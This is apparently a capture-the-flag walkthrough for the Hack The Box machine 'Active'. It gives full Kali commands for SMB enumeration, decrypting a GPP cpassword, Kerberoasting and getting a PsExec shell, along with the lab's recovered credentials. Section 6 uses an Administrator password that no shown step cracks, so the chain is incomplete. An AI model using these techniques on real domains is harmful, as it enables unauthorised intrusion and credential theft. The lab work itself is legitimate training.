# Hack The Box — Active walkthrough

HTB Active is a Windows Active Directory machine. The main skills to practise are SMB enumeration, Group Policy Preferences (GPP) credential discovery, password cracking, and Windows privilege escalation.

I'll structure this as a Kali walkthrough, with commands and what each step is meant to reveal. Use the target IP assigned by your HTB instance.

## 1. Initial scan

```
export T=<TARGET_IP>

sudo nmap -Pn -n -sC -sV -p- "$T" -oN nmap.txt
```

Active commonly exposes SMB on port 445, Kerberos on 88, LDAP on 389, and other Windows services. Confirm the actual results from your scan.

Check SMB shares:

```
nxc smb "$T" --shares
```

If anonymous access is allowed, try:

```
smbclient -N -L "//$T"
```

The goal is to find accessible shares and identify whether the server exposes SYSVOL or other domain resources.

## 2. Enumerate the Replication share

Check for anonymous SMB access:

```
smbclient -N -L "//$T"
```

Connect to the `Replication` share:

```
smbclient "//$T/Replication" -N
```

At the SMB prompt, recursively download its files:

```
recurse ON
prompt OFF
mget *
exit
```

Find the Group Policy Preferences XML file:

```
find . -iname 'Groups.xml'
```

The important path is usually:

```
active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
```

Inspect it:

```
cat ./active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
```

Look for the `cpassword` attribute and associated username. This is the GPP credential exposure that enables the next step.

## 3. Decrypt the GPP password

Install the utility if necessary:

```
sudo apt update
sudo apt install gpp-decrypt
```

Decrypt the value found in `Groups.xml`:

```
gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
```

The known result for this HTB machine is:

```
Username: SVC_TGS
Password: GPPstillStandingStrong2k18
```

GPP's legacy `cpassword` field uses a publicly known encryption key, so the password can be recovered offline.

## 4. Validate credentials and enumerate shares

```
nxc smb "10.129.75.102" -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares
```

Inspect readable shares and user directories:

```
smbclient "//10.129.75.102/Users" -U 'SVC_TGS'
```

Enter the password when prompted. Use `ls` to list files and directories, and `cd` to navigate. The `Users` share is one place to look for the user flag.

## 5. Kerberoast the Administrator service account

A Kerberoast attack requests Kerberos service tickets for accounts with Service Principal Names (SPNs). The returned ticket can be cracked offline if the account uses a weak password.

Request the service-ticket hashes:

```
impacket-GetUserSPNs active.htb/SVC_TGS:'GPPstillStandingStrong2k18' \
  -dc-ip "10.129.75.102" \
  -request \
  -outputfile kerberoast.txt
```

## 6. Get Administrator access

Validate the recovered credentials:

```
nxc smb "10.129.75.102" -u Administrator -p 'Ticketmaster1968'
```

Then, on the authorized HTB target, use Impacket PsExec:

```
impacket-psexec 'active.htb/Administrator:Ticketmaster1968'@"10.129.75.102"
```

If successful, you'll receive a remote command shell. Check the flags:

```
type C:\Users\Administrator\Desktop\root.txt
```

The same attack chain is documented in the recent Active walkthroughs.
